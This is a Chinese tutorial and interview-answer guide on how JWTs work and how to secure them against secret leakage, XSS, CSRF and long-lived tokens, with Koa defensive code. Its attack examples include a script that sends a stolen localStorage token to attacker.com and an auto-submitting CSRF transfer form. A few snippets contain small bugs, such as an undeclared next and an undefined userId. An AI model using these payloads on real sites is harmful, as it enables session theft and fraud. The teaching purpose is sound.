## 📚 核心知识点

### 1. JWT 结构与工作原理

**JWT 结构（三部分）：**
```
Header.Payload.Signature
```

**示例：**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VySWQiOjEyMywibmFtZSI6IkFsaWNlIn0.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**详细结构：**
```javascript
// 1. Header（算法 + 类型）
{
  "alg": "HS256",  // 签名算法
  "typ": "JWT"     // 令牌类型
}

// 2. Payload（数据）
{
  "userId": 123,
  "name": "Alice",
  "exp": 1735689600  // 过期时间
}

// 3. Signature（签名）
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret  // 密钥
)
```

**验证流程：**
```javascript
// 服务端验证
const [header, payload, signature] = token.split('.');

// 重新计算签名
const expectedSignature = HMACSHA256(
  header + '.' + payload,
  secret
);

// 比对签名
if (signature === expectedSignature) {
  // 签名有效
  const data = JSON.parse(base64Decode(payload));
  console.log(data);  // { userId: 123, name: "Alice" }
} else {
  // 签名无效（令牌被篡改）
}
```

## ⚠️ 主要安全隐患

### 隐患 1：Secret 泄露

**问题：**
```javascript
// ❌ 错误：Secret 硬编码在代码中
const jwt = require('jsonwebtoken');
const secret = 'my-super-secret-key';  // 泄露风险

const token = jwt.sign({ userId: 123 }, secret);
```

**后果：**
- 攻击者获取 Secret 后，可以伪造任意 JWT
- 可以冒充任何用户

**防护措施：**
```javascript
// ✅ 正确：使用环境变量
const secret = process.env.JWT_SECRET;

// ✅ 使用强密钥（至少 256 位）
// 生成：openssl rand -base64 32
const secret = 'kJhG7nZ...（32 字节随机字符串）';

// ✅ 定期轮换密钥
const secrets = {
  current: process.env.JWT_SECRET_CURRENT,
  previous: process.env.JWT_SECRET_PREVIOUS
};

// 验证时支持多个密钥
function verifyToken(token) {
  try {
    return jwt.verify(token, secrets.current);
  } catch (err) {
    return jwt.verify(token, secrets.previous);  // 回退到旧密钥
  }
}
```

### 隐患 2：XSS 攻击（窃取 Token）

**攻击场景：**
```javascript
// 攻击者注入恶意脚本
<script>
  // 窃取 localStorage 中的 JWT
  const token = localStorage.getItem('jwt');
  
  // 发送到攻击者服务器
  fetch('https://attacker.com/steal?token=' + token);
</script>
```

**防护措施 1：使用 HttpOnly Cookie（推荐）**
```javascript
const Koa = require('koa');
const jwt = require('jsonwebtoken');

const app = new Koa();

// 登录
app.use(async ctx => {
  if (ctx.url === '/login') {
    const token = jwt.sign({ userId: 123 }, secret);
    
    // ✅ 存储在 HttpOnly Cookie（JavaScript 无法访问）
    ctx.cookies.set('jwt', token, {
      httpOnly: true,   // 防止 JavaScript 访问
      secure: true,     // 仅 HTTPS 传输
      sameSite: 'strict',  // 防止 CSRF
      maxAge: 3600000   // 1 小时
    });
    
    ctx.body = { message: 'Login successful' };
  }
});

// 验证
app.use(async ctx => {
  const token = ctx.cookies.get('jwt');
  
  if (!token) {
    ctx.status = 401;
    ctx.body = { error: 'Unauthorized' };
    return;
  }
  
  try {
    const decoded = jwt.verify(token, secret);
    ctx.state.user = decoded;
    await next();
  } catch (err) {
    ctx.status = 401;
    ctx.body = { error: 'Invalid token' };
  }
});
```

**防护措施 2：CSP（Content Security Policy）**
```javascript
// 禁止内联脚本
app.use(async (ctx, next) => {
  ctx.set('Content-Security-Policy', "script-src 'self'");
  await next();
});
```

### 隐患 3：CSRF 攻击

**攻击场景：**
```html
<!-- 攻击者网站 -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>
  // 自动提交表单（携带 Cookie 中的 JWT）
  document.forms[0].submit();
</script>
```

**防护措施 1：SameSite Cookie**
```javascript
ctx.cookies.set('jwt', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'  // ✅ 防止跨站请求携带 Cookie
});
```

**防护措施 2：CSRF Token**
```javascript
const crypto = require('crypto');

// 生成 CSRF Token
app.use(async (ctx, next) => {
  const csrfToken = crypto.randomBytes(32).toString('hex');
  
  ctx.cookies.set('csrfToken', csrfToken, {
    httpOnly: false  // 前端需要读取
  });
  
  ctx.state.csrfToken = csrfToken;
  await next();
});

// 验证 CSRF Token
app.use(async (ctx, next) => {
  if (ctx.method !== 'GET') {
    const cookieToken = ctx.cookies.get('csrfToken');
    const headerToken = ctx.headers['x-csrf-token'];
    
    if (cookieToken !== headerToken) {
      ctx.status = 403;
      ctx.body = { error: 'Invalid CSRF token' };
      return;
    }
  }
  
  await next();
});
```

### 隐患 4：令牌过期与刷新

**问题：**
```javascript
// ❌ 错误：长期有效的 JWT（1 年）
const token = jwt.sign({ userId: 123 }, secret, {
  expiresIn: '365d'  // 令牌被盗后，1 年内都有效
});
```

**解决方案：刷新令牌（Refresh Token）**
```javascript
const jwt = require('jsonwebtoken');
const Redis = require('ioredis');

const redis = new Redis();

// 登录
app.post('/login', async ctx => {
  const { username, password } = ctx.request.body;
  
  // 验证用户...
  
  // 1. 生成短期访问令牌（15 分钟）
  const accessToken = jwt.sign(
    { userId: 123 },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );
  
  // 2. 生成长期刷新令牌（7 天）
  const refreshToken = jwt.sign(
    { userId: 123, type: 'refresh' },
    process.env.REFRESH_SECRET,
    { expiresIn: '7d' }
  );
  
  // 3. 存储刷新令牌到 Redis（支持撤销）
  await redis.set(
    `refresh_token:${refreshToken}`,
    userId,
    'EX',
    7 * 24 * 3600
  );
  
  ctx.body = { accessToken, refreshToken };
});

// 刷新令牌
app.post('/refresh', async ctx => {
  const { refreshToken } = ctx.request.body;
  
  try {
    // 1. 验证刷新令牌
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET);
    
    // 2. 检查令牌是否在 Redis 中（未被撤销）
    const userId = await redis.get(`refresh_token:${refreshToken}`);
    
    if (!userId) {
      ctx.status = 401;
      ctx.body = { error: 'Refresh token revoked' };
      return;
    }
    
    // 3. 生成新的访问令牌
    const accessToken = jwt.sign(
      { userId: decoded.userId },
      process.env.JWT_SECRET,
      { expiresIn: '15m' }
    );
    
    ctx.body = { accessToken };
  } catch (err) {
    ctx.status = 401;
    ctx.body = { error: 'Invalid refresh token' };
  }
});

// 登出（撤销刷新令牌）
app.post('/logout', async ctx => {
  const { refreshToken } = ctx.request.body;
  
  // 删除 Redis 中的刷新令牌
  await redis.del(`refresh_token:${refreshToken}`);
  
  ctx.body = { message: 'Logout successful' };
});
```

## 💻 完整实战案例

### 案例：安全的 JWT 认证系统

```javascript
const Koa = require('koa');
const Router = require('@koa/router');
const bodyParser = require('koa-bodyparser');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');
const Redis = require('ioredis');

const app = new Koa();
const router = new Router();
const redis = new Redis();

app.use(bodyParser());

// 配置
const JWT_SECRET = process.env.JWT_SECRET;
const REFRESH_SECRET = process.env.REFRESH_SECRET;
const ACCESS_TOKEN_EXPIRY = '15m';
const REFRESH_TOKEN_EXPIRY = '7d';

// 1. 注册
router.post('/register', async ctx => {
  const { username, password } = ctx.request.body;
  
  // 密码加密
  const hashedPassword = await bcrypt.hash(password, 10);
  
  // 保存到数据库...
  const userId = await db.users.create({ username, password: hashedPassword });
  
  ctx.body = { userId, message: 'Registration successful' };
});

// 2. 登录
router.post('/login', async ctx => {
  const { username, password } = ctx.request.body;
  
  // 查询用户
  const user = await db.users.findByUsername(username);
  
  if (!user || !(await bcrypt.compare(password, user.password))) {
    ctx.status = 401;
    ctx.body = { error: 'Invalid credentials' };
    return;
  }
  
  // 生成访问令牌（短期）
  const accessToken = jwt.sign(
    { userId: user.id, username: user.username },
    JWT_SECRET,
    { expiresIn: ACCESS_TOKEN_EXPIRY }
  );
  
  // 生成刷新令牌（长期）
  const refreshToken = jwt.sign(
    { userId: user.id, type: 'refresh' },
    REFRESH_SECRET,
    { expiresIn: REFRESH_TOKEN_EXPIRY }
  );
  
  // 存储刷新令牌到 Redis
  await redis.set(
    `refresh_token:${user.id}:${refreshToken}`,
    JSON.stringify({ userId: user.id, createdAt: Date.now() }),
    'EX',
    7 * 24 * 3600
  );
  
  // 设置 HttpOnly Cookie
  ctx.cookies.set('jwt', accessToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000  // 15 分钟
  });
  
  ctx.body = {
    accessToken,
    refreshToken,
    expiresIn: 900  // 15 分钟（秒）
  };
});

// 3. 刷新令牌
router.post('/refresh', async ctx => {
  const { refreshToken } = ctx.request.body;
  
  if (!refreshToken) {
    ctx.status = 401;
    ctx.body = { error: 'Refresh token required' };
    return;
  }
  
  try {
    // 验证刷新令牌
    const decoded = jwt.verify(refreshToken, REFRESH_SECRET);
    
    // 检查令牌是否在 Redis 中
    const key = `refresh_token:${decoded.userId}:${refreshToken}`;
    const tokenData = await redis.get(key);
    
    if (!tokenData) {
      ctx.status = 401;
      ctx.body = { error: 'Refresh token revoked or expired' };
      return;
    }
    
    // 生成新的访问令牌
    const accessToken = jwt.sign(
      { userId: decoded.userId },
      JWT_SECRET,
      { expiresIn: ACCESS_TOKEN_EXPIRY }
    );
    
    ctx.cookies.set('jwt', accessToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 15 * 60 * 1000
    });
    
    ctx.body = {
      accessToken,
      expiresIn: 900
    };
  } catch (err) {
    ctx.status = 401;
    ctx.body = { error: 'Invalid refresh token' };
  }
});

// 4. 登出
router.post('/logout', async ctx => {
  const { refreshToken } = ctx.request.body;
  
  if (refreshToken) {
    // 撤销刷新令牌
    const decoded = jwt.decode(refreshToken);
    if (decoded) {
      await redis.del(`refresh_token:${decoded.userId}:${refreshToken}`);
    }
  }
  
  // 清除 Cookie
  ctx.cookies.set('jwt', '', { maxAge: 0 });
  
  ctx.body = { message: 'Logout successful' };
});

// 5. 认证中间件
async function authMiddleware(ctx, next) {
  const token = ctx.cookies.get('jwt') || ctx.headers.authorization?.replace('Bearer ', '');
  
  if (!token) {
    ctx.status = 401;
    ctx.body = { error: 'Unauthorized' };
    return;
  }
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    ctx.state.user = decoded;
    await next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      ctx.status = 401;
      ctx.body = { error: 'Token expired' };
    } else {
      ctx.status = 401;
      ctx.body = { error: 'Invalid token' };
    }
  }
}

// 6. 受保护的路由
router.get('/profile', authMiddleware, async ctx => {
  const user = await db.users.findById(ctx.state.user.userId);
  ctx.body = { user };
});

app.use(router.routes());
app.listen(3000);
```

## 🎓 面试标准答题

### 问题 1："JWT 的工作原理是什么？有哪些安全隐患？"

**标准答案：**
> **JWT 工作原理：**
> 
> **1. 结构（三部分）**
> - Header：算法 + 类型
> - Payload：数据（用户 ID、过期时间）
> - Signature：签名（防篡改）
> 
> **2. 流程**
> ```
> 1. 用户登录 → 服务端生成 JWT
> 2. 客户端存储 JWT（Cookie/localStorage）
> 3. 后续请求携带 JWT
> 4. 服务端验证签名 + 过期时间
> ```
> 
> **主要安全隐患：**
> 
> **1. Secret 泄露**
> - 攻击者可伪造任意 JWT
> - 防护：环境变量、强密钥、定期轮换
> 
> **2. XSS 攻击（窃取 Token）**
> - 存储在 localStorage 易被窃取
> - 防护：HttpOnly Cookie + CSP
> 
> **3. CSRF 攻击**
> - 跨站请求携带 Cookie
> - 防护：SameSite Cookie + CSRF Token
> 
> **4. 令牌过期**
> - 长期有效令牌风险高
> - 防护：短期访问令牌 + 长期刷新令牌

**加分项：**
> 在实际项目中，我们使用：
> - 访问令牌（15分钟）+ 刷新令牌（7天）
> - HttpOnly Cookie 存储访问令牌
> - Redis 存储刷新令牌（支持撤销）
> - SameSite=Strict 防止 CSRF

---

### 问题 2："JWT 和 Session 的区别？哪个更安全？"

**标准答案：**
> **核心区别：**
> 
> | 特性 | JWT | Session |
> |------|-----|---------|
> | **存储** | 客户端 | 服务端 |
> | **状态** | 无状态 | 有状态 |
> | **撤销** | 困难（需黑名单） | 容易（删除 Session） |
> | **扩展性** | 好（无状态） | 差（需共享 Session） |
> | **安全性** | 中（依赖 Secret） | 高（服务端控制） |
> 
> **安全性对比：**
> 
> **JWT：**
> - ❌ 无法主动撤销（除非维护黑名单）
> - ❌ Payload 可被解码（不要存敏感数据）
> - ✅ 无状态，易扩展
> 
> **Session：**
> - ✅ 可主动撤销（删除 Session）
> - ✅ 数据存储在服务端（安全）
> - ❌ 有状态，需共享 Session
> 
> **选择建议：**
> - 高安全性要求 → Session
> - 微服务/分布式 → JWT
> - 混合方案 → JWT（访问令牌）+ Session（刷新令牌）
